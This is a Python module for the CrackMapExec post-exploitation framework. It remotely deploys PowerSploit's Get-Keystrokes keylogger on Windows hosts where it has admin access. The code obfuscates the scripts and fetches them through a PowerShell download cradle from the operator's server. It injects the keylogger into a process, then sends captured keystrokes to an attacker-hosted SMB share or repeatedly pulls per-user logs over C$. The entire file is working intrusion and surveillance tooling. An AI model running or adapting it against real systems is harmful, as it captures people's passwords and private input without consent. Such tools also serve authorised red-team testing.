from cme.helpers.powershell import *
from cme.helpers.misc import gen_random_string
from cme.servers.smb import CMESMBServer
from time import sleep
from sys import exit
import os

class CMEModule:
    '''
        Executes PowerSploit's Get-Keystrokes script
        Module by @byt3bl33d3r
    '''

    name = 'get_keystrokes'
    description = "Logs keys pressed, time and the active window"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        TIMEOUT   Specifies the interval in minutes to capture keystrokes.
        STREAM    Specifies whether to stream the keys over the network (default: False)
        POLL      Specifies the interval in seconds to poll the log file (default: 20)
        '''

        if 'TIMEOUT' not in module_options:
            context.log.error('TIMEOUT option is required!')
            exit(1)

        self.stream  = False
        self.poll    = 20
        self.timeout = int(module_options['TIMEOUT'])

        if 'STREAM' in module_options:
            self.stream = bool(module_options['STREAM'])
        if 'POLL' in module_options:
            self.poll = int(module_options['POLL'])

        context.log.info('This module will not exit until CTRL-C is pressed')
        context.log.info('Keystrokes will be stored in ~/.cme/logs\n')

        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
        self.ps_script2 = obfs_ps_script('powersploit/Exfiltration/Get-Keystrokes.ps1')

        if self.stream:
            self.share_name = gen_random_string(5).upper()
            self.smb_server = CMESMBServer(context.log, self.share_name, context.log_folder_path)
            self.smb_server.start()
        else:
            self.file_name = gen_random_string(5)

    def on_admin_login(self, context, connection):
        keys_folder = 'get_keystrokes_{}'.format(connection.host)

        if not self.stream:
            command = 'Get-Keystrokes -LogPath "$Env:Temp\\{}" -Timeout {}'.format(self.file_name, self.timeout)
        else:
            command = 'Get-Keystrokes -LogPath \\\\{}\\{}\\{}\\keys.log -Timeout {}'.format(context.localip, self.share_name, keys_folder, self.timeout)

        keys_command = gen_ps_iex_cradle(context, 'Get-Keystrokes.ps1', command, post_back=False)

        launcher = gen_ps_inject(keys_command, context)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

        if not self.stream:
            users = connection.loggedon_users()
            keys_folder_path = os.path.join(context.log_folder_path, keys_folder)

            try:
                while True:
                    for user in users:
                        if '$' not in user.wkui1_username and os.path.exists(keys_folder_path):
                            keys_log = os.path.join(keys_folder_path, 'keys_{}.log'.format(user.wkui1_username))

                            with open(keys_log, 'a+') as key_file:
                                file_path = '/Users/{}/AppData/Local/Temp/{}'.format(user.wkui1_username, self.file_name)
                                try:
                                    connection.conn.getFile('C$', file_path, key_file.write)
                                    context.log.success('Got keys! Stored in {}'.format(keys_log))
                                except Exception as e:
                                    context.log.debug('Error retrieving key file contents from {}: {}'.format(file_path, e))

                    sleep(self.poll)
            except KeyboardInterrupt:
                pass

    def on_request(self, context, request):
        if 'Invoke-PSInject.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        elif 'Get-Keystrokes.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            # We received the callback, so lets setup the folder to store the keys
            keys_folder_path = os.path.join(context.log_folder_path, 'get_keystrokes_{}'.format(request.client_address[0]))
            if not os.path.exists(keys_folder_path): os.mkdir(keys_folder_path)

            request.wfile.write(self.ps_script2)
            request.stop_tracking_host()

        else:
            request.send_response(404)
            request.end_headers()

    def on_shutdown(self, context, connection):
        if self.stream:
            self.smb_server.shutdown()
